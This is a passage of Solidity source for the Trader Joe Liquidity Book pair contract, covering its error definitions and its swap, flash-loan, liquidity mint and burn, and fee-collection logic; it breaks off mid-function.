SafeCast__Exceeds192Bits(uint256 x);\nerror SafeCast__Exceeds184Bits(uint256 x);\nerror SafeCast__Exceeds176Bits(uint256 x);\nerror SafeCast__Exceeds168Bits(uint256 x);\nerror SafeCast__Exceeds160Bits(uint256 x);\nerror SafeCast__Exceeds152Bits(uint256 x);\nerror SafeCast__Exceeds144Bits(uint256 x);\nerror SafeCast__Exceeds136Bits(uint256 x);\nerror SafeCast__Exceeds128Bits(uint256 x);\nerror SafeCast__Exceeds120Bits(uint256 x);\nerror SafeCast__Exceeds112Bits(uint256 x);\nerror SafeCast__Exceeds104Bits(uint256 x);\nerror SafeCast__Exceeds96Bits(uint256 x);\nerror SafeCast__Exceeds88Bits(uint256 x);\nerror SafeCast__Exceeds80Bits(uint256 x);\nerror SafeCast__Exceeds72Bits(uint256 x);\nerror SafeCast__Exceeds64Bits(uint256 x);\nerror SafeCast__Exceeds56Bits(uint256 x);\nerror SafeCast__Exceeds48Bits(uint256 x);\nerror SafeCast__Exceeds40Bits(uint256 x);\nerror SafeCast__Exceeds32Bits(uint256 x);\nerror SafeCast__Exceeds24Bits(uint256 x);\nerror SafeCast__Exceeds16Bits(uint256 x);\nerror SafeCast__Exceeds8Bits(uint256 x);\n\n/** TreeMath errors */\n\nerror TreeMath__ErrorDepthSearch();\n\n/** JoeLibrary errors */\n\nerror JoeLibrary__IdenticalAddresses();\nerror JoeLibrary__AddressZero();\nerror JoeLibrary__InsufficientAmount();\nerror JoeLibrary__InsufficientLiquidity();\n\n/** TokenHelper errors */\n\nerror TokenHelper__TransferFailed(IERC20 token, address recipient, uint256 amount);\n\n/** LBQuoter errors */\n\nerror LBQuoter_InvalidLength();\n\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/** Imports **/\n\nimport \"./LBErrors.sol\";\nimport \"./LBToken.sol\";\nimport \"./libraries/BinHelper.sol\";\nimport \"./libraries/Constants.sol\";\nimport \"./libraries/Decoder.sol\";\nimport \"./libraries/FeeDistributionHelper.sol\";\nimport \"./libraries/Math512Bits.sol\";\nimport \"./libraries/Oracle.sol\";\nimport \"./libraries/ReentrancyGuardUpgradeable.sol\";\nimport \"./libraries/SafeCast.sol\";\nimport \"./libraries/SafeMath.sol\";\nimport \"./libraries/SwapHelper.sol\";\nimport \"./libraries/TokenHelper.sol\";\nimport \"./libraries/TreeMath.sol\";\nimport \"./interfaces/ILBFlashLoanCallback.sol\";\nimport \"./interfaces/ILBPair.sol\";\n\n/// @title Liquidity Book Pair\n/// @author Trader Joe\n/// @notice The implementation of Liquidity Book Pair that also acts as the receipt token for liquidity positions\ncontract LBPair is LBToken, ReentrancyGuardUpgradeable, ILBPair {\n    /** Libraries **/\n\n    using Math512Bits for uint256;\n    using TreeMath for mapping(uint256 => uint256)[3];\n    using SafeCast for uint256;\n    using SafeMath for uint256;\n    using TokenHelper for IERC20;\n    using FeeHelper for FeeHelper.FeeParameters;\n    using SwapHelper for Bin;\n    using Decoder for bytes32;\n    using FeeDistributionHelper for FeeHelper.FeesDistribution;\n    using Oracle for bytes32[65_535];\n\n    /** Modifiers **/\n\n    modifier onlyFactory() {\n        if (msg.sender != address(factory)) revert LBPair__OnlyFactory();\n        _;\n    }\n\n    /** Public immutable variables **/\n\n    ILBFactory public immutable override factory;\n\n    /** Public variables **/\n\n    IERC20 public override tokenX;\n    IERC20 public override tokenY;\n\n    /** Private variables **/\n\n    PairInformation private _pairInformation;\n    FeeHelper.FeeParameters private _feeParameters;\n    /// @dev The reserves of tokens for every bin. This is the amount\n    /// of tokenY if `id < _pairInformation.activeId`; of tokenX if `id > _pairInformation.activeId`\n    /// and a mix of both if `id == _pairInformation.activeId`\n    mapping(uint256 => Bin) private _bins;\n    /// @dev Tree to find bins with non zero liquidity\n    mapping(uint256 => uint256)[3] private _tree;\n    /// @dev Mapping from account to user's unclaimed fees. The first 128 bits are tokenX and the last are for tokenY\n    mapping(address => bytes32) private _unclaimedFees;\n    /// @dev Mapping from account to id to user's accruedDebt.\n    mapping(address => mapping(uint256 => Debts)) private _accruedDebts;\n    /// @dev Oracle array\n    bytes32[65_535] private _oracle;\n\n    /** OffSets */\n\n    uint256 private constant _OFFSET_PAIR_RESERVE_X = 24;\n    uint256 private constant _OFFSET_PROTOCOL_FEE = 128;\n    uint256 private constant _OFFSET_BIN_RESERVE_Y = 112;\n    uint256 private constant _OFFSET_VARIABLE_FEE_PARAMETERS = 144;\n    uint256 private constant _OFFSET_ORACLE_SAMPLE_LIFETIME = 136;\n    uint256 private constant _OFFSET_ORACLE_SIZE = 152;\n    uint256 private constant _OFFSET_ORACLE_ACTIVE_SIZE = 168;\n    uint256 private constant _OFFSET_ORACLE_LAST_TIMESTAMP = 184;\n    uint256 private constant _OFFSET_ORACLE_ID = 224;\n\n    /** Constructor **/\n\n    /// @notice Set the factory address\n    /// @param _factory The address of the factory\n    constructor(ILBFactory _factory) LBToken() {\n        if (address(_factory) == address(0)) revert LBPair__AddressZero();\n        factory = _factory;\n    }\n\n    /// @notice Initialize the parameters of the LBPair\n    /// @dev The different parameters needs to be validated very cautiously.\n    /// It is highly recommended to never call this function directly, use the factory\n    /// as it validates the different parameters\n    /// @param _tokenX The address of the tokenX. Can't be address 0\n    /// @param _tokenY The address of the tokenY. Can't be address 0\n    /// @param _activeId The active id of the pair\n    /// @param _sampleLifetime The lifetime of a sample. It's the min time between 2 oracle's sample\n    /// @param _packedFeeParameters The fee parameters packed in a single 256 bits slot\n    function initialize(\n        IERC20 _tokenX,\n        IERC20 _tokenY,\n        uint24 _activeId,\n        uint16 _sampleLifetime,\n        bytes32 _packedFeeParameters\n    ) external override onlyFactory {\n        if (address(_tokenX) == address(0) || address(_tokenY) == address(0)) revert LBPair__AddressZero();\n        if (address(tokenX) != address(0)) revert LBPair__AlreadyInitialized();\n\n        __ReentrancyGuard_init();\n\n        tokenX = _tokenX;\n        tokenY = _tokenY;\n\n        _pairInformation.activeId = _activeId;\n        _pairInformation.oracleSampleLifetime = _sampleLifetime;\n\n        _setFeesParameters(_packedFeeParameters);\n        _increaseOracle(2);\n    }\n\n    /** External View Functions **/\n\n    /// @notice View function to get the reserves and active id\n    /// @return reserveX The reserve of asset X\n    /// @return reserveY The reserve of asset Y\n    /// @return activeId The active id of the pair\n    function getReservesAndId()\n        external\n        view\n        override\n        returns (\n            uint256 reserveX,\n            uint256 reserveY,\n            uint256 activeId\n        )\n    {\n        return _getReservesAndId();\n    }\n\n    /// @notice View function to get the global fees information, the total fees and those for protocol\n    /// @dev The fees for users are `total - protocol`\n    /// @return feesXTotal The total fees of asset X\n    /// @return feesYTotal The total fees of asset Y\n    /// @return feesXProtocol The protocol fees of asset X\n    /// @return feesYProtocol The protocol fees of asset Y\n    function getGlobalFees()\n        external\n        view\n        override\n        returns (\n            uint256 feesXTotal,\n            uint256 feesYTotal,\n            uint256 feesXProtocol,\n            uint256 feesYProtocol\n        )\n    {\n        return _getGlobalFees();\n    }\n\n    /// @notice View function to get the oracle parameters\n    /// @return oracleSampleLifetime The lifetime of a sample, it accumulates information for up to this timestamp\n    /// @return oracleSize The size of the oracle (last ids can be empty)\n    /// @return oracleActiveSize The active size of the oracle (no empty data)\n    /// @return oracleLastTimestamp The timestamp of the creation of the oracle's latest sample\n    /// @return oracleId The index of the oracle's latest sample\n    /// @return min The min delta time of two samples\n    /// @return max The safe max delta time of two samples\n    function getOracleParameters()\n        external\n        view\n        override\n        returns (\n            uint256 oracleSampleLifetime,\n            uint256 oracleSize,\n            uint256 oracleActiveSize,\n            uint256 oracleLastTimestamp,\n            uint256 oracleId,\n            uint256 min,\n            uint256 max\n        )\n    {\n        (oracleSampleLifetime, oracleSize, oracleActiveSize, oracleLastTimestamp, oracleId) = _getOracleParameters();\n        min = oracleActiveSize == 0 ? 0 : oracleSampleLifetime;\n        max = oracleSampleLifetime * oracleActiveSize;\n    }\n\n    /// @notice View function to get the oracle's sample at `_timeDelta` seconds\n    /// @dev Return a linearized sample, the weighted average of 2 neighboring samples\n    /// @param _timeDelta The number of seconds before the current timestamp\n    /// @return cumulativeId The weighted average cumulative id\n    /// @return cumulativeVolatilityAccumulated The weighted average cumulative volatility accumulated\n    /// @return cumulativeBinCrossed The weighted average cumulative bin crossed\n    function getOracleSampleFrom(uint256 _timeDelta)\n        external\n        view\n        override\n        returns (\n            uint256 cumulativeId,\n            uint256 cumulativeVolatilityAccumulated,\n            uint256 cumulativeBinCrossed\n        )\n    {\n        uint256 _lookUpTimestamp = block.timestamp - _timeDelta;\n\n        (, , uint256 _oracleActiveSize, , uint256 _oracleId) = _getOracleParameters();\n\n        uint256 timestamp;\n        (timestamp, cumulativeId, cumulativeVolatilityAccumulated, cumulativeBinCrossed) = _oracle.getSampleAt(\n            _oracleActiveSize,\n            _oracleId,\n            _lookUpTimestamp\n        );\n\n        if (timestamp < _lookUpTimestamp) {\n            FeeHelper.FeeParameters memory _fp = _feeParameters;\n            uint256 _activeId = _pairInformation.activeId;\n            _fp.updateVariableFeeParameters(_activeId);\n\n            unchecked {\n                uint256 _deltaT = _lookUpTimestamp - timestamp;\n\n                cumulativeId += _activeId * _deltaT;\n                cumulativeVolatilityAccumulated += uint256(_fp.volatilityAccumulated) * _deltaT;\n            }\n        }\n    }\n\n    /// @notice View function to get the fee parameters\n    /// @return The fee parameters\n    function feeParameters() external view override returns (FeeHelper.FeeParameters memory) {\n        return _feeParameters;\n    }\n\n    /// @notice View function to get the first bin that isn't empty, will not be `_id` itself\n    /// @param _id The bin id\n    /// @param _swapForY Whether you've swapping token X for token Y (true) or token Y for token X (false)\n    /// @return The id of the non empty bin\n    function findFirstNonEmptyBinId(uint24 _id, bool _swapForY) external view override returns (uint24) {\n        return _tree.findFirstBin(_id, _swapForY);\n    }\n\n    /// @notice View function to get the bin at `id`\n    /// @param _id The bin id\n    /// @return reserveX The reserve of tokenX of the bin\n    /// @return reserveY The reserve of tokenY of the bin\n    function getBin(uint24 _id) external view override returns (uint256 reserveX, uint256 reserveY) {\n        return _getBin(_id);\n    }\n\n    /// @notice View function to get the pending fees of a user\n    /// @dev The array must be strictly increasing to ensure uniqueness\n    /// @param _account The address of the user\n    /// @param _ids The list of ids\n    /// @return amountX The amount of tokenX pending\n    /// @return amountY The amount of tokenY pending\n    function pendingFees(address _account, uint256[] memory _ids)\n        external\n        view\n        override\n        returns (uint256 amountX, uint256 amountY)\n    {\n        bytes32 _unclaimedData = _unclaimedFees[_account];\n\n        amountX = _unclaimedData.decode(type(uint128).max, 0);\n        amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n        uint256 _lastId;\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                uint256 _id = _ids[i];\n\n                // Ensures uniqueness of ids\n                if (_lastId >= _id && i != 0) revert LBPair__OnlyStrictlyIncreasingId();\n\n                uint256 _balance = balanceOf(_account, _id);\n\n                if (_balance != 0) {\n                    Bin memory _bin = _bins[_id];\n\n                    (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _account, _id, _balance);\n\n                    amountX += _amountX;\n                    amountY += _amountY;\n                }\n\n                _lastId = _id;\n            }\n        }\n    }\n\n    /** External Functions **/\n\n    /// @notice Performs a low level swap, this needs to be called from a contract which performs important safety checks\n    /// @dev Will swap the full amount that this contract received of token X or Y\n    /// @param _swapForY whether the token sent was Y (true) or X (false)\n    /// @param _to The address of the recipient\n    /// @return amountXOut The amount of token X sent to `_to`\n    /// @return amountYOut The amount of token Y sent to `_to`\n    function swap(bool _swapForY, address _to)\n        external\n        override\n        nonReentrant\n        returns (uint256 amountXOut, uint256 amountYOut)\n    {\n        PairInformation memory _pair = _pairInformation;\n\n        uint256 _amountIn = _swapForY\n            ? tokenX.received(_pair.reserveX, _pair.feesX.total)\n            : tokenY.received(_pair.reserveY, _pair.feesY.total);\n\n        if (_amountIn == 0) revert LBPair__InsufficientAmounts();\n\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n        _fp.updateVariableFeeParameters(_pair.activeId);\n        uint256 _startId = _pair.activeId;\n\n        uint256 _amountOut;\n        // Performs the actual swap, bin per bin\n        // It uses the findFirstBin function to make sure the bin we're currently looking at\n        // has liquidity in it.\n        while (true) {\n            Bin memory _bin = _bins[_pair.activeId];\n            if ((!_swapForY && _bin.reserveX != 0) || (_swapForY && _bin.reserveY != 0)) {\n                (uint256 _amountInToBin, uint256 _amountOutOfBin, FeeHelper.FeesDistribution memory _fees) = _bin\n                    .getAmounts(_fp, _pair.activeId, _swapForY, _amountIn);\n\n                _bin.updateFees(_swapForY ? _pair.feesX : _pair.feesY, _fees, _swapForY, totalSupply(_pair.activeId));\n\n                _bin.updateReserves(_pair, _swapForY, _amountInToBin.safe112(), _amountOutOfBin.safe112());\n\n                _amountIn -= _amountInToBin + _fees.total;\n                _amountOut += _amountOutOfBin;\n\n                _bins[_pair.activeId] = _bin;\n\n                if (_swapForY) {\n                    emit Swap(\n                        msg.sender,\n                        _to,\n                        _pair.activeId,\n                        _amountInToBin,\n                        0,\n                        0,\n                        _amountOutOfBin,\n                        _fp.volatilityAccumulated,\n                        _fees.total,\n                        0\n                    );\n                } else {\n                    emit Swap(\n                        msg.sender,\n                        _to,\n                        _pair.activeId,\n                        0,\n                        _amountInToBin,\n                        _amountOutOfBin,\n                        0,\n                        _fp.volatilityAccumulated,\n                        0,\n                        _fees.total\n                    );\n                }\n            }\n\n            if (_amountIn != 0) {\n                _pair.activeId = _tree.findFirstBin(_pair.activeId, _swapForY);\n            } else {\n                break;\n            }\n        }\n\n        if (_amountOut == 0) revert LBPair__BrokenSwapSafetyCheck(); // Safety check\n\n        // We use oracleSize so it can start filling empty slot that were added recently\n        uint256 _updatedOracleId = _oracle.update(\n            _pair.oracleSize,\n            _pair.oracleSampleLifetime,\n            _pair.oracleLastTimestamp,\n            _pair.oracleId,\n            _pair.activeId,\n            _fp.volatilityAccumulated,\n            _startId.absSub(_pair.activeId)\n        );\n\n        // We update the oracleId and lastTimestamp if the sample write on another slot\n        if (_updatedOracleId != _pair.oracleId || _pair.oracleLastTimestamp == 0) {\n            // Can't overflow as the updatedOracleId < oracleSize\n            _pair.oracleId = uint16(_updatedOracleId);\n            _pair.oracleLastTimestamp = block.timestamp.safe40();\n\n            // We increase the activeSize if the updated sample is written in a new slot\n            // Can't overflow as _updatedOracleId < maxSize = 2**16-1\n            unchecked {\n                if (_updatedOracleId == _pair.oracleActiveSize) ++_pair.oracleActiveSize;\n            }\n        }\n\n        _feeParameters = _fp;\n        _pairInformation = _pair;\n\n        if (_swapForY) {\n            amountYOut = _amountOut;\n            tokenY.safeTransfer(_to, _amountOut);\n        } else {\n            amountXOut = _amountOut;\n            tokenX.safeTransfer(_to, _amountOut);\n        }\n    }\n\n    /// @notice Performs a flash loan\n    /// @param _to the address that will execute the external call\n    /// @param _amountXOut The amount of tokenX\n    /// @param _amountYOut The amount of tokenY\n    /// @param _data The bytes data that will be forwarded to _to\n    function flashLoan(\n        address _to,\n        uint256 _amountXOut,\n        uint256 _amountYOut,\n        bytes calldata _data\n    ) external override nonReentrant {\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n\n        uint256 _fee = factory.flashLoanFee();\n\n        FeeHelper.FeesDistribution memory _feesX = _fp.getFeeAmountDistribution(_getFlashLoanFee(_amountXOut, _fee));\n        FeeHelper.FeesDistribution memory _feesY = _fp.getFeeAmountDistribution(_getFlashLoanFee(_amountYOut, _fee));\n\n        (uint256 _reserveX, uint256 _reserveY, uint256 _id) = _getReservesAndId();\n\n        tokenX.safeTransfer(_to, _amountXOut);\n        tokenY.safeTransfer(_to, _amountYOut);\n\n        ILBFlashLoanCallback(_to).LBFlashLoanCallback(\n            msg.sender,\n            _amountXOut,\n            _amountYOut,\n            _feesX.total,\n            _feesY.total,\n            _data\n        );\n\n        _feesX.flashLoanHelper(_pairInformation.feesX, tokenX, _reserveX);\n        _feesY.flashLoanHelper(_pairInformation.feesY, tokenY, _reserveY);\n\n        uint256 _totalSupply = totalSupply(_id);\n\n        _bins[_id].accTokenXPerShare += _feesX.getTokenPerShare(_totalSupply);\n        _bins[_id].accTokenYPerShare += _feesY.getTokenPerShare(_totalSupply);\n\n        emit FlashLoan(msg.sender, _to, _amountXOut, _amountYOut, _feesX.total, _feesY.total);\n    }\n\n    /// @notice Performs a low level add, this needs to be called from a contract which performs important safety checks.\n    /// @param _ids The list of ids to add liquidity\n    /// @param _distributionX The distribution of tokenX with sum(_distributionX) = 1e18 (100%) or 0 (0%)\n    /// @param _distributionY The distribution of tokenY with sum(_distributionY) = 1e18 (100%) or 0 (0%)\n    /// @param _to The address of the recipient\n    /// @return The amount of token X that was added to the pair\n    /// @return The amount of token Y that was added to the pair\n    /// @return liquidityMinted Amount of LBToken minted\n    function mint(\n        uint256[] memory _ids,\n        uint256[] memory _distributionX,\n        uint256[] memory _distributionY,\n        address _to\n    )\n        external\n        override\n        nonReentrant\n        returns (\n            uint256,\n            uint256,\n            uint256[] memory liquidityMinted\n        )\n    {\n        if (_ids.length == 0 || _ids.length != _distributionX.length || _ids.length != _distributionY.length)\n            revert LBPair__WrongLengths();\n\n        PairInformation memory _pair = _pairInformation;\n\n        FeeHelper.FeeParameters memory _fp = _feeParameters;\n\n        MintInfo memory _mintInfo;\n\n        _mintInfo.amountXIn = tokenX.received(_pair.reserveX, _pair.feesX.total).safe128();\n        _mintInfo.amountYIn = tokenY.received(_pair.reserveY, _pair.feesY.total).safe128();\n\n        liquidityMinted = new uint256[](_ids.length);\n\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                _mintInfo.id = _ids[i].safe24();\n                Bin memory _bin = _bins[_mintInfo.id];\n\n                if (_bin.reserveX == 0 && _bin.reserveY == 0) _tree.addToTree(_mintInfo.id);\n\n                _mintInfo.distributionX = _distributionX[i];\n                _mintInfo.distributionY = _distributionY[i];\n\n                if (\n                    _mintInfo.distributionX > Constants.PRECISION ||\n                    _mintInfo.distributionY > Constants.PRECISION ||\n                    (_mintInfo.totalDistributionX += _mintInfo.distributionX) > Constants.PRECISION ||\n                    (_mintInfo.totalDistributionY += _mintInfo.distributionY) > Constants.PRECISION\n                ) revert LBPair__DistributionsOverflow();\n\n                // Can't overflow as amounts are uint128 and distributions are smaller or equal to 1e18\n                _mintInfo.amountX = (_mintInfo.amountXIn * _mintInfo.distributionX) / Constants.PRECISION;\n                _mintInfo.amountY = (_mintInfo.amountYIn * _mintInfo.distributionY) / Constants.PRECISION;\n\n                uint256 _price = BinHelper.getPriceFromId(_mintInfo.id, _fp.binStep);\n                if (_mintInfo.id >= _pair.activeId) {\n                    if (_mintInfo.id == _pair.activeId) {\n                        uint256 _totalSupply = totalSupply(_mintInfo.id);\n\n                        uint256 _userL = _price.mulShiftRoundDown(_mintInfo.amountX, Constants.SCALE_OFFSET) +\n                            _mintInfo.amountY;\n\n                        uint256 _receivedX;\n                        uint256 _receivedY;\n                        {\n                            uint256 _supply = _totalSupply + _userL;\n                            _receivedX = (_userL * (uint256(_bin.reserveX) + _mintInfo.amountX)) / _supply;\n                            _receivedY = (_userL * (uint256(_bin.reserveY) + _mintInfo.amountY)) / _supply;\n                        }\n\n                        _fp.updateVariableFeeParameters(_mintInfo.id);\n\n                        if (_mintInfo.amountX > _receivedX) {\n                            FeeHelper.FeesDistribution memory _fees = _fp.getFeeAmountDistribution(\n                                _fp.getFeeAmountForC(_mintInfo.amountX - _receivedX)\n                            );\n\n                            _mintInfo.amountX -= _fees.total;\n                            _mintInfo.activeFeeX += _fees.total;\n\n                            _bin.updateFees(_pair.feesX, _fees, true, _totalSupply);\n\n                            emit CompositionFee(msg.sender, _to, _mintInfo.id, _fees.total, 0);\n                        } else if (_mintInfo.amountY > _receivedY) {\n                            FeeHelper.FeesDistribution memory _fees = _fp.getFeeAmountDistribution(\n                                _fp.getFeeAmountForC(_mintInfo.amountY - _receivedY)\n                            );\n\n                            _mintInfo.amountY -= _fees.total;\n                            _mintInfo.activeFeeY += _fees.total;\n\n                            _bin.updateFees(_pair.feesY, _fees, false, _totalSupply);\n\n                            emit CompositionFee(msg.sender, _to, _mintInfo.id, 0, _fees.total);\n                        }\n                    } else if (_mintInfo.amountY != 0) revert LBPair__CompositionFactorFlawed(_mintInfo.id);\n                } else if (_mintInfo.amountX != 0) revert LBPair__CompositionFactorFlawed(_mintInfo.id);\n\n                uint256 _liquidity = _price.mulShiftRoundDown(_mintInfo.amountX, Constants.SCALE_OFFSET) +\n                    _mintInfo.amountY;\n\n                if (_liquidity == 0) revert LBPair__InsufficientLiquidityMinted(_mintInfo.id);\n\n                liquidityMinted[i] = _liquidity;\n\n                // The addition can't overflow as the amounts are checked to be uint128 and the reserves are uint112\n                _bin.reserveX = (_mintInfo.amountX + _bin.reserveX).safe112();\n                _bin.reserveY = (_mintInfo.amountY + _bin.reserveY).safe112();\n\n                // The addition or the cast can't overflow as it would have reverted during the L568 and L569 if amounts were greater than uint112\n                _pair.reserveX += uint112(_mintInfo.amountX);\n                _pair.reserveY += uint112(_mintInfo.amountY);\n\n                _mintInfo.amountXAddedToPair += _mintInfo.amountX;\n                _mintInfo.amountYAddedToPair += _mintInfo.amountY;\n\n                _bins[_mintInfo.id] = _bin;\n                _mint(_to, _mintInfo.id, _liquidity);\n\n                emit LiquidityAdded(\n                    msg.sender,\n                    _to,\n                    _mintInfo.id,\n                    _liquidity,\n                    _mintInfo.amountX,\n                    _mintInfo.amountY,\n                    _mintInfo.distributionX,\n                    _mintInfo.distributionY\n                );\n            }\n\n            _pairInformation = _pair;\n\n            uint256 _amountAddedPlusFee = _mintInfo.amountXAddedToPair + _mintInfo.activeFeeX;\n            // If user sent too much tokens, We send them back the excess\n            if (_mintInfo.amountXIn > _amountAddedPlusFee) {\n                tokenX.safeTransfer(_to, _mintInfo.amountXIn - _amountAddedPlusFee);\n            }\n\n            _amountAddedPlusFee = _mintInfo.amountYAddedToPair + _mintInfo.activeFeeY;\n            if (_mintInfo.amountYIn > _amountAddedPlusFee) {\n                tokenY.safeTransfer(_to, _mintInfo.amountYIn - _amountAddedPlusFee);\n            }\n        }\n\n        return (_mintInfo.amountXAddedToPair, _mintInfo.amountYAddedToPair, liquidityMinted);\n    }\n\n    /// @notice Performs a low level remove, this needs to be called from a contract which performs important safety checks\n    /// @param _ids The ids the user want to remove its liquidity\n    /// @param _amounts The amount of token to burn\n    /// @param _to The address of the recipient\n    /// @return amountX The amount of token X sent to `_to`\n    /// @return amountY The amount of token Y sent to `_to`\n    function burn(\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        address _to\n    ) external override nonReentrant returns (uint256 amountX, uint256 amountY) {\n        (uint256 _pairReserveX, uint256 _pairReserveY, uint256 _activeId) = _getReservesAndId();\n        unchecked {\n            for (uint256 i; i < _ids.length; ++i) {\n                uint24 _id = _ids[i].safe24();\n                uint256 _amountToBurn = _amounts[i];\n\n                if (_amountToBurn == 0) revert LBPair__InsufficientLiquidityBurned(_id);\n\n                (uint256 _reserveX, uint256 _reserveY) = _getBin(_id);\n\n                uint256 _totalSupply = totalSupply(_id);\n\n                uint256 _amountX;\n                uint256 _amountY;\n\n                if (_id <= _activeId) {\n                    _amountY = _amountToBurn.mulDivRoundDown(_reserveY, _totalSupply);\n\n                    amountY += _amountY;\n                    _reserveY -= _amountY;\n                    _pairReserveY -= _amountY;\n                }\n                if (_id >= _activeId) {\n                    _amountX = _amountToBurn.mulDivRoundDown(_reserveX, _totalSupply);\n\n                    amountX += _amountX;\n                    _reserveX -= _amountX;\n                    _pairReserveX -= _amountX;\n                }\n\n                if (_reserveX == 0 && _reserveY == 0) _tree.removeFromTree(_id);\n\n                // Optimized `_bins[_id] = _bin` to do only 1 sstore\n                assembly {\n                    mstore(0, _id)\n                    mstore(32, _bins.slot)\n                    let slot := keccak256(0, 64)\n\n                    let reserves := add(shl(_OFFSET_BIN_RESERVE_Y, _reserveY), _reserveX)\n                    sstore(slot, reserves)\n                }\n\n                _burn(address(this), _id, _amountToBurn);\n\n                emit LiquidityRemoved(msg.sender, _to, _id, _amountToBurn, _amountX, _amountY);\n            }\n        }\n\n        // Optimization to do only 2 sstore\n        _pairInformation.reserveX = uint136(_pairReserveX);\n        _pairInformation.reserveY = uint136(_pairReserveY);\n\n        tokenX.safeTransfer(_to, amountX);\n        tokenY.safeTransfer(_to, amountY);\n    }\n\n    /// @notice Increase the length of the oracle\n    /// @param _newSize The new size of the oracle. Needs to be bigger than current one\n    function increaseOracleLength(uint16 _newSize) external override {\n        _increaseOracle(_newSize);\n    }\n\n    /// @notice Collect fees of an user\n    /// @param _account The address of the user\n    /// @param _ids The list of bin ids to collect fees in\n    /// @return amountX The amount of tokenX claimed\n    /// @return amountY The amount of tokenY claimed\n    function collectFees(address _account, uint256[] memory _ids)\n        external\n        override\n        nonReentrant\n        returns (uint256 amountX, uint256 amountY)\n    {\n        unchecked {\n            bytes32 _unclaimedData = _unclaimedFees[_account];\n            delete _unclaimedFees[_account];\n\n            amountX = _unclaimedData.decode(type(uint128).max, 0);\n            amountY = _unclaimedData.decode(type(uint128).max, 128);\n\n            for (uint256 i; i < _ids.length; ++i) {\n                uint256 _id = _ids[i];\n                uint256 _balance = balanceOf(_account, _id);\n\n                if (_balance != 0) {\n                    Bin memory _bin = _bins[_id];\n\n                    (uint256 _amountX, uint256 _amountY) = _getPendingFees(_bin, _account, _id, _balance);\n                    _updateUserDebts(_bin, _account, _id, _balance);\n\n                    amountX += _amountX;\n                    amountY += _amountY;\n                }\n            }\n\n            if (amountX != 0) {\n                _pairInformation.feesX.total -= uint128(amountX);\n            }\n            if (amountY != 0) {\n                _pairInformation.feesY.total -= uint128(amountY);\n            }\n\n            tokenX.safeTransfer(_account, amountX);\n            tokenY.safeTransfer(_account, amountY);\n\n            emit FeesCollected(msg.sender, _account, amountX, amountY);\n        }\n    }\n\n    /// @notice Collect the protocol fees and send them to the feeRecipient\n    /// @dev The balances are not zeroed to save gas by not resetting the storage slot\n    /// Only callable by the fee recipient\n    /// @return amountX The amount of tokenX claimed\n    /// @return amountY The amount of tokenY claimed\n    function collectProtocolFees() external override nonReentrant returns (uint256 amountX, uint256 amountY) {\n        unchecked {\n            address _feeRecipient = factory.feeRecipient();\n\n            if (msg.sender != _feeRecipient) revert LBPair__OnlyFeeRecipient(_feeRecipient, msg.sender);\n\n            // The fees returned can't be greater than uint128, so the assembly blocks are safe\n            (\n                uint256 _feesXTotal,\n                uint256 _feesYTotal,\n                uint256 _feesXProtocol,\n                uint256 _feesYProtocol\n            ) = _getGlobalFees();\n\n            if (_feesXProtocol > 1) {\n                amountX = _feesXProtocol - 1;\n                _feesXTotal -= amountX;\n\n                // Assembly block that does:\n                // _pairInformation.feesX = FeeHelper.FeesDistribution({total: _feesXTotal, protocol: 1});\n                assembly {\n                    let _slotX := add(_pairInformation.slot, 2)\n\n                    sstore(_slotX, add(shl(_OFFSET_PROTOCOL_FEE, 1), _feesXTotal))\n                }\n\n                tokenX.safeTransfer(_feeRecipient, amountX);\n            }\n\n            if (_feesYProtocol > 1) {\n                amountY = _feesYProtocol - 1;\n                _feesYTotal -= amountY;\n\n                // Assembly block that does:\n                // _pairInformation.feesY = FeeHelper.FeesDistribution({total: _feesYTotal, protocol: 1});\n                assembly {\n                    let _slotY := add(_pairInformation.slot, 3)\n\n                    sstore(_slotY, add(shl(_OFFSET_PROTOCOL_FEE, 1), _feesYTotal))\n                }\n\n                tokenY.safeTransfer(_feeRecipient, amountY);\n            }\n\n            emit ProtocolFeesCollected(msg.sender, _feeRecipient, amountX, amountY);\n        }\n    }\n\n    /// @notice Set the fees parameters\n    /// @dev Needs to be called by the factory that will validate the values\n    /// The bin step will not change\n    /// Only callable by the factory\n    /// @param _packedFeeParameters The packed fee parameters\n    function setFeesParameters(bytes32 _packedFeeParameters) external override onlyFactory {\n        _setFeesParameters(_packedFeeParameters);\n    }\n\n    function forceDecay() external override onlyFactory {\n        unchecked {\n            _feeParameters.volatilityReference = uint24(\n                (uint256(_feeParameters.reductionFactor) * _feeParameters.volatilityReference) /\n                    Constants.BASIS_POINT_MAX\n            );\n        }\n    }\n\n    /** Internal Functions **/\n\n    /// @notice Collect and update fees before any token transfer, mint or burn\n    /// @param _from The address of the owner of the token\n    /// @param _to The address of the recipient of the  token\n    /// @param _id The id of the token\n    /// @param _amount The amount of token of type `id`\n    function _beforeTokenTransfer(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount\n    ) internal override(LBToken) {\n        unchecked {\n            super._beforeTokenTransfer(_from, _to, _id, _amount);\n\n            Bin memory _bin = _bins[_id];\n\n            if (_from != _to) {\n                if (_from != address(0) && _from != address(this)) {\n                    uint256 _balanceFrom = balanceOf(_from, _id);\n\n                    _cacheFees(_bin, _from, _id, _balanceFrom, _balanceFrom - _amount);\n                }\n\n                if (_to != address(0) && _to != address(this)) {\n                    uint256 _balanceTo = balanceOf(_to, _id);\n\n                    _cacheFees(_bin, _to, _id, _balanceTo, _balanceTo + _amount);\n                }\n            }\n        }\n    }\n\n    /** Private Functions **/\n\n    /// @notice View function to get the pending fees of an account on a given bin\n    /// @param _bin  The bin where the user is collecting fees\n    /// @param _account The address of the user\n    /// @param _id The id where the user is collecting fees\n    /// @param _balance The previous balance of the user\n    /// @return amountX The amount of tokenX pending for the account\n    /// @return amountY The amount of tokenY pending for the account\n    function _getPendingFees(\n        Bin memory _bin,\n        address _account,\n        uint256 _id,\n        uint256 _balance\n    ) private view returns (uint256 amountX, uint256 amountY) {\n        Debts memory _debts = _accruedDebts[_account][_id];\n\n        amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;\n        amountY = 